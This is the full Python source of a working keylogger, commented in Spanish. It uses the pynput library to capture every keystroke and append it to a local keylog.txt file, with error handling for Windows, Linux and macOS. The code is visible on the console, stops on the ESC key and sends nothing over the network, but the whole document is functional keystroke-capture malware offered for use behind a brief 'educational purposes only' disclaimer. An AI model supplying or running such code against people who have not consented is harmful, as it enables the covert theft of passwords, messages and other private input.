#!/usr/bin/env python3
"""
Keylogger Offline Multiplataforma en Python 3 - Versión Robusta

Este script registra las pulsaciones del teclado y las almacena en un archivo local (keylog.txt).
Está diseñado para ser multiplataforma (Windows, Linux y macOS) e incluye manejo robusto de excepciones
para entornos sin soporte gráfico. En caso de no detectar un entorno gráfico (por ejemplo, en Linux sin X11),
se registra un mensaje de error y se termina la ejecución de forma controlada.

IMPORTANTE:
- Úsalo únicamente para fines educativos y en entornos controlados.
- Interceptar teclas sin autorización es ilegal y poco ético.
"""

import os
import sys
import time
import threading
import logging

# Intentar importar la librería pynput; si no está instalada, se aborta la ejecución.
try:
    from pynput import keyboard
except ImportError:
    sys.exit("Error: La librería 'pynput' no está instalada. Instálala con 'pip install pynput'.")

# Configuración del logging: se guarda en un archivo de depuración y se imprime por consola.
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler("keylogger_debug.log"),
        logging.StreamHandler()
    ]
)

# Archivo donde se registrarán las teclas.
LOG_FILE = "keylog.txt"

# Bloqueo para acceso seguro al archivo de log desde posibles múltiples hilos.
log_lock = threading.Lock()

class Keylogger:
    """
    Clase Keylogger para capturar y registrar las pulsaciones del teclado.
    """
    def __init__(self, log_file=LOG_FILE):
        self.log_file = log_file
        self.listener = None
        self.running = False

    def log_key(self, key_str):
        """
        Registra la cadena de la tecla en el archivo de log.
        Utiliza un lock para evitar condiciones de carrera.
        """
        try:
            with log_lock:
                with open(self.log_file, "a", encoding="utf-8") as f:
                    f.write(key_str + " ")
        except Exception as e:
            logging.error(f"Error al escribir en el archivo de log: {e}")

    def on_press(self, key):
        """
        Callback que se ejecuta cada vez que se presiona una tecla.
        Intenta obtener el carácter; si no es posible, registra su representación.
        """
        try:
            if hasattr(key, 'char') and key.char is not None:
                key_str = key.char
            elif hasattr(key, 'name'):
                key_str = f"[{key.name}]"
            else:
                key_str = f"[{key}]"
        except Exception as e:
            key_str = f"[Error: {e}]"
        self.log_key(key_str)

    def on_release(self, key):
        """
        Callback para la liberación de teclas.
        Finaliza el listener si se presiona la tecla ESC.
        """
        if key == keyboard.Key.esc:
            return False

    def start(self):
        """
        Inicia el listener del teclado.
        Se manejan excepciones para entornos sin soporte gráfico.
        """
        try:
            self.running = True
            with keyboard.Listener(on_press=self.on_press, on_release=self.on_release) as listener:
                self.listener = listener
                logging.info("Keylogger iniciado. Presiona ESC para detenerlo.")
                listener.join()
        except Exception as e:
            logging.error(f"Error iniciando el listener del teclado: {e}")
            self.running = False

def main():
    """
    Función principal que inicializa y ejecuta el keylogger.
    Antes de iniciar, verifica si se dispone de un entorno gráfico en Linux (variable DISPLAY).
    """
    # En Linux, comprobamos la variable DISPLAY para detectar entorno gráfico.
    if sys.platform.startswith("linux") and "DISPLAY" not in os.environ:
        logging.error("No se detectó entorno gráfico (variable DISPLAY no encontrada). Este keylogger requiere un entorno gráfico.")
        sys.exit(1)

    # Crear el archivo de log si no existe.
    if not os.path.exists(LOG_FILE):
        try:
            with open(LOG_FILE, "w", encoding="utf-8") as f:
                f.write(f"Keylogger iniciado a las {time.ctime()}\n")
        except Exception as e:
            logging.error(f"Error al crear el archivo de log: {e}")
            sys.exit(1)

    keylogger = Keylogger()
    try:
        keylogger.start()
    except KeyboardInterrupt:
        logging.info("Keylogger detenido por el usuario (KeyboardInterrupt).")
    except Exception as e:
        logging.error(f"Excepción no manejada: {e}")
    finally:
        logging.info("Keylogger finalizado.")

if __name__ == "__main__":
    main()
